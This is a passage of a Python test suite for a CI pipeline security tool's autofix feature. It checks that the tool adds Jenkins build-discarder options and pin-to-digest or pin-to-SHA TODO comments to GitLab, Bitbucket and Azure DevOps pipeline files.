            "    agent {\n"
            "        docker { image 'node:18' }\n"
            "    }\n"
            "    stages {\n"
            "        stage('Build') {\n"
            "            steps { echo 'hi' }\n"
            "        }\n"
            "    }\n"
            "}\n"
        )
        after = autofix.generate_fix(
            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
        )
        assert after is not None
        assert "options {" in after
        assert "buildDiscarder" in after


# ── GitLab image pinning TODO (GL-001) ────────────────────────────────


class TestGL001ImagePinning:
    def test_adds_todo_to_unpinned_image(self):
        ci = (
            "build:\n"
            "  image: node:18\n"
            "  script:\n"
            "    - npm test\n"
        )
        after = autofix.generate_fix(_finding("GL-001"), ci)
        assert after is not None
        assert "TODO(pipeline-check): pin to digest" in after

    def test_skips_digest_pinned_image(self):
        ci = (
            "build:\n"
            "  image: node@sha256:abcdef1234567890\n"
            "  script:\n"
            "    - npm test\n"
        )
        assert autofix.generate_fix(_finding("GL-001"), ci) is None


# ── Bitbucket pipe pinning TODO (BB-001) ──────────────────────────────


class TestBB001PipePinning:
    def test_adds_todo_to_unpinned_pipe(self):
        pipeline = (
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script:\n"
            "          - echo hi\n"
            "        - pipe: atlassian/aws-s3-deploy:1.0.0\n"
        )
        after = autofix.generate_fix(_finding("BB-001"), pipeline)
        assert after is not None
        assert "TODO(pipeline-check): pin to commit SHA" in after

    def test_idempotent_when_todo_exists(self):
        pipeline = (
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        - pipe: atlassian/foo:1.0  # TODO(pipeline-check): pin to commit SHA\n"
        )
        after = autofix.generate_fix(_finding("BB-001"), pipeline)
        assert after is None


# ── Azure task pinning TODO (ADO-001) ─────────────────────────────────


class TestADO001TaskPinning:
    def test_adds_todo_to_unpinned_task(self):
        pipeline = (
            "steps:\n"
            "  - task: DotNetCoreCLI@2\n"
            "    inputs:\n"
            "      command: build\n"
        )
        after = autofix.generate_fix(_finding("ADO-001"), pipeline)
        assert after is not None
        assert "TODO(pipeline-check): pin to commit SHA" in after

    def test_idempotent_when_todo_exists(self):
        pipeline = (
            "steps:\n"
            "  - task: DotNetCoreCLI@2  # TODO(pipeline-check): pin to commit SHA\n"
        )
        assert autofix.generate_fix(_finding("ADO-001"), pipeline) is None
